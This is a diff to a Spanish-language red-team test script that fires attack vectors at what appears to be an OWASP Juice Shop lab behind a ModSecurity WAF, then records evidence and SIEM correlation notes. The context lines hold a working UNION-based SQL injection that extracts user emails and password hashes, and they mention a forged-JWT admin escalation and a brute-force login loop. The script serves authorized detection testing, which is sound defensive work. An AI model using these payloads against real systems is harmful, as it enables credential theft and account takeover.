@@ -111,6 +111,9 @@ IDS+=("V-01"); VECT+=("SQLi login"); SEES+=("Sí (942xxx)"); OBS+=("$code"); ver
 # ----------------------------------------------------------------------------
 echo; echo "[V-02] SQLi UNION  GET /rest/products/search?q=...UNION SELECT...FROM Users--"
 d="$EVID/V-02-sqli-union-search"; mkdir -p "$d"
+# El UNION de 10 columnas está atado al esquema de Users/Products de la imagen v20.3.0
+# (ver red-team/poc/README.md). Si cambia la versión y el número de columnas no cuadra,
+# la app responde 500 en vez de filas; el script lo reporta tal cual (no es evasión del WAF).
 Q="qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9','10' FROM Users--"
 echo "$Q" > "$d/payload.txt"
 code=$(curl -s -A "$RUN-V02" -G "$BASE_URL/rest/products/search" --data-urlencode "q=$Q" \
@@ -179,7 +182,7 @@ IDS+=("V-05"); VECT+=("JWT forjado -> admin"); SEES+=("No (firma válida)"); OBS
 # ----------------------------------------------------------------------------
 # V-06 · Fuerza bruta  (BO-2/SO-6 · F3 N× 401 sin payload · WAF NO limita; SIEM por ráfaga)
 # ----------------------------------------------------------------------------
-echo; echo "[V-06] Fuerza bruta  $N× POST /rest/user/login (contraseñas erróneas) desde la misma IP"
+echo; echo "[V-06] Fuerza bruta  ${N}× POST /rest/user/login (contraseñas erróneas) desde la misma IP"
 d="$EVID/V-06-brute-force-login"; mkdir -p "$d"
 : > "$d/codigos.txt"
 for i in $(seq 1 "$N"); do
@@ -207,6 +210,11 @@ SUM="$EVID/resumen.md"
   echo "- Objetivo: \`$BASE_URL\` (WAF ModSecurity + CRS)"
   echo "- Modo WAF observado: **$MODE** (sondeo HTTP $PROBE_CODE) · .env declara: \`$ENV_MODE\`"
   echo "- Marcador para el SIEM: \`$RUN\` → en Kibana filtrar \`user_agent.original: $RUN*\`"
+  echo "  - Cubre V-01/02/03/06 (el WAF registra estas peticiones en su audit log)."
+  echo "  - V-04 y V-05 son peticiones legítimas (200 OK) que no disparan regla CRS: NO se"
+  echo "    correlacionan por UA. Para esas dos, el dato de correlación es endpoint + la hora de"
+  echo "    esta corrida + el token/carrito guardado en su carpeta de evidencia (lo detecta Blue"
+  echo "    a nivel de aplicación, no el WAF)."
   echo
   echo "| ID | Vector | ¿WAF lo ve? | Observado | Esperado ($MODE) | Veredicto |"
   echo "|---|---|---|---|---|---|"
